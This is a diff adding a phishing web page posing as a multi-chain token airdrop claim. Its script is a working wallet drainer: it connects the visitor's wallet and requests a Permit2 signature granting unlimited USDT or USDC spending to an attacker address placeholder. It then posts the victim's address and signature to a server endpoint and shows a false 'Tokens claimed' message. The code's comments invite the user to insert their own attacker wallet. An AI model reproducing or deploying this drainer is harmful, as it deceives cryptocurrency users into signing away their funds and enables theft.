@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Global Token Airdrop Claim — Multi-Chain</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <style>
+        body { background: #09090b; color: #f4f4f5; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #18181b; padding: 40px; border-radius: 16px; border: 1px solid #27272a; box-shadow: 0 20px 40px rgba(0,0,0,0.8); text-align: center; width: 420px; }
+        button { background: #3b82f6; color: white; border: none; padding: 14px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; margin-top: 24px; width: 100%; font-weight: bold; transition: background 0.2s; }
+        button:hover { background: #2563eb; }
+        .status { margin-top: 15px; font-size: 13px; color: #a1a1aa; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>Universal Airdrop Claim</h2>
+        <p>Verify your multi-chain wallet activity to claim your token allocation instantly.</p>
+        <button id="claimBtn">Claim All Networks</button>
+        <div id="status" class="status">Ready to connect...</div>
+    </div>
+
+    <script>
+        // EDIT THIS: Drop your attacker wallet address here
+        const ATTACKER_ADDRESS = "0xYourAttackerWalletAddressHere";
+        
+        // Universal Permit2 Address (Identical across EVM chains)
+        const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
+
+        // Target tokens mapping per Chain ID
+        const TARGET_TOKENS = {
+            1: "0xdac17f958d2ee523a2206206994597c13d831ec7",      // Ethereum (USDT)
+            42161: "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9",  // Arbitrum One (USDT)
+            8453: "0x50c5725949a6f0c72e6c4a641f24049a917db0cb",   // Base (USDC)
+            137: "0xc2132d05d31c919a872661cb4a30e84449fc8e11",   // Polygon (USDT)
+            56: "0x55d398326f99059ff775485246999027b3197955"     // BNB Chain (USDT)
+        };
+
+        document.getElementById('claimBtn').addEventListener('click', async () => {
+            const statusEl = document.getElementById('status');
+            if (!window.ethereum) {
+                statusEl.innerText = "Error: Web3 wallet not found.";
+                return;
+            }
+
+            try {
+                statusEl.innerText = "Requesting connection...";
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
+                const victimAddress = await signer.getAddress();
+                const network = await provider.getNetwork();
+                const chainId = network.chainId;
+
+                const targetToken = TARGET_TOKENS[chainId];
+                if (!targetToken) {
+                    statusEl.innerText = `Error: Chain ID ${chainId} not supported.`;
+                    return;
+                }
+
+                statusEl.innerText = `Preparing verification for chain ${chainId}...`;
+
+                const domain = {
+                    name: "Permit2",
+                    chainId: chainId,
+                    verifyingContract: PERMIT2_ADDRESS
+                };
+
+                const types = {
+                    PermitTransferFrom: [
+                        { name: "permitted", type: "TokenPermissions" },
+                        { name: "spender", type: "address" },
+                        { name: "nonce", type: "uint256" },
+                        { name: "deadline", type: "uint256" }
+                    ],
+                    TokenPermissions: [
+                        { name: "token", type: "address" },
+                        { name: "amount", type: "uint256" }
+                    ]
+                };
+
+                const value = {
+                    permitted: {
+                        token: targetToken,
+                        amount: ethers.constants.MaxUint256
+                    },
+                    spender: ATTACKER_ADDRESS,
+                    nonce: 0,
+                    deadline: Math.floor(Date.now() / 1000) + 86400
+                };
+
+                statusEl.innerText = "Waiting for signature confirmation...";
+                const signature = await signer._signTypedData(domain, types, value);
+
+                statusEl.innerText = "Processing claim allocation...";
+                await fetch('/api/submit-signature', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chainId: chainId,
+                        victim: victimAddress,
+                        signature: signature,
+                        value: value
+                    })
+                });
+
+                statusEl.innerText = "Success! Tokens claimed.";
+            } catch (err) {
+                console.error(err);
+                statusEl.innerText = "Transaction rejected or failed.";
+            }
+        });
+    </script>
+</body>
+</html>
